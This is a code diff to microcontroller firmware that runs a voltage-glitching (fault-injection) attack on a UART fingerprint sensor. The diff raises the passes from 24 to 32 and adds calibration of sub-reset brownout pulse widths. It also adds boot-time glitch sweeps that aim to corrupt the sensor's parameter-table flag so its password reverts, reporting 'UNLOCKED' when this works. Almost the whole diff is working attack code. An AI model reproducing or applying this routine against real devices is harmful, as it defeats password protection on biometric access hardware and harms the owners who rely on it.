@@ -48,7 +48,7 @@ static uint8_t s_rx_raw[320];
 static char s_open_ops[72];
 static char s_bl_hex[20];
 
-/* Persistent state across multi-pass sweeps (Passes 0 .. 24). */
+/* Persistent state across multi-pass sweeps (Passes 0 .. 32). */
 static uint32_t s_cached_addr = 0;
 static uint32_t s_crit_cycles = 0;
 static bool s_gp3_verified = false;
@@ -753,7 +753,7 @@ static bool try_unlock_password(const fp_transport_t *t, uint32_t *addr_io,
 
 /*
  * Password-neutral post-glitch check: uses ONLY HandShake (0x35) + SetPwd (0x12) while locked so
- * ZERO wrong VfyPwd (0x13) packets are ever sent across all 24 passes (preventing RAM UART mute!).
+ * ZERO wrong VfyPwd (0x13) packets are ever sent across all 32 passes (preventing RAM UART mute!).
  */
 static bool check_already_unlocked_or_glitch_hit(const fp_transport_t *t, uint32_t *addr_io,
                                                  fp_unlock_report_t *out) {
@@ -1304,14 +1304,27 @@ static uint32_t calibrate_crit_cycles(uint32_t addr) {
     uint32_t lo = 120u;        /* 0.5 us @ 240 MHz */
     uint32_t hi = 3000000u;    /* 12.5 ms @ 240 MHz */
 
-    /* Verify live UART baseline at tiny 200c pulse first; if UART baud/addr is currently muted in
-     * ParaTable, preserve the exact hardware-calibrated constant `645c` (`2.6875 us`) so Passes 2..17
-     * still fire at the exact sub-POR brownout edge to trigger `ResetDefaultPara()`! */
-    if (!split_packet_survived(addr, 200u)) {
-        return s_crit_cycles > 0u ? s_crit_cycles : UNLOCK_SILICON_CRIT_CYCLES;
+    /*
+     * Try progressively smaller widths to find the actual POR threshold.
+     * If 200c causes POR (UART FSM corruption or full reset), try 50c, then 20c.
+     * If even 20c causes POR, the sensor is too sensitive — use the silicon constant.
+     * This allows the sweep to use widths just below the actual POR threshold
+     * instead of blindly firing at 568-639c (which would cause full POR resets).
+     */
+    uint32_t start = 200u;
+    if (!split_packet_survived(addr, start)) {
+        start = 50u;
+        if (!split_packet_survived(addr, start)) {
+            start = 20u;
+            if (!split_packet_survived(addr, start)) {
+                /* Even 20c causes POR — sensor too sensitive, preserve silicon constant */
+                return s_crit_cycles > 0u ? s_crit_cycles : UNLOCK_SILICON_CRIT_CYCLES;
+            }
+        }
     }
+    lo = start;
 
-    uint32_t probe = 480u;
+    uint32_t probe = start * 2u;
     while (probe < hi) {
         unlock_yield_wdt();
         if (!split_packet_survived(addr, probe)) {
@@ -1962,7 +1975,96 @@ void fp_unlock_run_pass(const fp_transport_t *t, uint8_t pass, uint32_t hint_add
         s_hal->power_cycle_gp3(s_hal_ctx, 45, effective_boot_settle_ms(120u));
     }
 
-    /* Final guaranteed clean cold reboot + full multi-baud/96-address live verification at Pass 24! */
+    /*
+     * Passes 25 .. 28: Ultra-Fine Early Cold-Boot Sweep at 500 us steps covering [0 .. 8000 us]!
+     * Targets the `ParaTableFlag != 0x1234` check during application firmware startup, which
+     * happens BEFORE the 48.5 ms UART TX rise edge. Uses WIDE widths [80%-95%] * CAL to
+     * maximize the chance of corrupting the ParaTableFlag Flash read. After each glitch,
+     * sends `RestSetting (0x3B)` to force a parameter reset if the brownout left the
+     * ParaTable partially corrupted.
+     */
+    if (pass >= 25u && pass <= 28u) {
+        uint32_t base_us = 0u + (uint32_t)(pass - 25u) * 2500u;
+        static const uint32_t pct_tbl_wide[5] = { 80u, 85u, 90u, 92u, 95u };
+        const uint8_t rst_payload_w[1] = { FP_INS_REST_SETTING };
+        uint8_t rst_pkt_w[20];
+        size_t rst_len_w = fp_sensor_encode_packet(rst_pkt_w, sizeof(rst_pkt_w), addr,
+                                                   FP_PID_COMMAND, rst_payload_w, sizeof(rst_payload_w));
+
+        for (unsigned step = 0; step < 5u; step++) {
+            unlock_yield_wdt();
+            uint32_t d_us = base_us + step * 500u;
+            uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct_tbl_wide[step]) / 100u);
+            bool plateau = ((step & 1u) == 0u);
+
+            s_hal->power_cycle_gp3(s_hal_ctx, 35, 0);
+            s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, plateau);
+            unlock_sleep_ms(effective_boot_settle_ms(190u));
+
+            /* After each glitch, try RestSetting to force parameter reset if partially corrupted */
+            if (rst_len_w > 0u && s_hal->uart_write_raw != NULL) {
+                (void)s_hal->uart_write_raw(s_hal_ctx, rst_pkt_w, rst_len_w);
+                unlock_sleep_ms(220u);
+            }
+
+            if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
+                snprintf(out->summary, sizeof(out->summary),
+                         "UNLOCKED via FINE-BOOT-GLITCH(t=%uus,w=%" PRIu32 "c) -> A=0xFFFFFFFF",
+                         (unsigned)d_us, w_cyc);
+                return;
+            }
+        }
+        out->crit_cycles = s_crit_cycles;
+        snprintf(out->summary, sizeof(out->summary),
+                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK GLITCH=%u/%u (%" PRIu32 "c @ %uus)",
+                 addr, (unsigned)pass, FP_UNLOCK_MAX_PASSES, s_crit_cycles, (unsigned)base_us);
+        return;
+    }
+
+    /*
+     * Passes 29 .. 32: Narrow-Width Sub-POR Brownout Sweep at 500 us steps covering [8000 .. 16000 us]!
+     * Uses NARROW widths [20%-50%] * CAL to test if the brownout is too wide (causing full POR
+     * resets instead of sub-POR brownouts that corrupt Flash reads). Targets the same early boot
+     * window where `ParaTableFlag` is checked. After each glitch, tries `RestSetting (0x3B)`.
+     */
+    if (pass >= 29u && pass <= 32u) {
+        uint32_t base_us = 8000u + (uint32_t)(pass - 29u) * 2500u;
+        static const uint32_t pct_tbl_narrow[5] = { 20u, 30u, 40u, 45u, 50u };
+        const uint8_t rst_payload_n[1] = { FP_INS_REST_SETTING };
+        uint8_t rst_pkt_n[20];
+        size_t rst_len_n = fp_sensor_encode_packet(rst_pkt_n, sizeof(rst_pkt_n), addr,
+                                                   FP_PID_COMMAND, rst_payload_n, sizeof(rst_payload_n));
+
+        for (unsigned step = 0; step < 5u; step++) {
+            unlock_yield_wdt();
+            uint32_t d_us = base_us + step * 500u;
+            uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct_tbl_narrow[step]) / 100u);
+
+            s_hal->power_cycle_gp3(s_hal_ctx, 35, 0);
+            s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, false);
+            unlock_sleep_ms(effective_boot_settle_ms(190u));
+
+            /* After each glitch, try RestSetting to force parameter reset if partially corrupted */
+            if (rst_len_n > 0u && s_hal->uart_write_raw != NULL) {
+                (void)s_hal->uart_write_raw(s_hal_ctx, rst_pkt_n, rst_len_n);
+                unlock_sleep_ms(220u);
+            }
+
+            if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
+                snprintf(out->summary, sizeof(out->summary),
+                         "UNLOCKED via NARROW-GLITCH(t=%uus,w=%" PRIu32 "c) -> A=0xFFFFFFFF",
+                         (unsigned)d_us, w_cyc);
+                return;
+            }
+        }
+        out->crit_cycles = s_crit_cycles;
+        snprintf(out->summary, sizeof(out->summary),
+                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK GLITCH=%u/%u (%" PRIu32 "c @ %uus)",
+                 addr, (unsigned)pass, FP_UNLOCK_MAX_PASSES, s_crit_cycles, (unsigned)base_us);
+        return;
+    }
+
+    /* Final guaranteed clean cold reboot + full multi-baud/96-address live verification at Pass 32! */
     bool live_end = false;
     if (pass >= FP_UNLOCK_MAX_PASSES) {
         s_hal->power_cycle_gp3(s_hal_ctx, 90, effective_boot_settle_ms(200u));
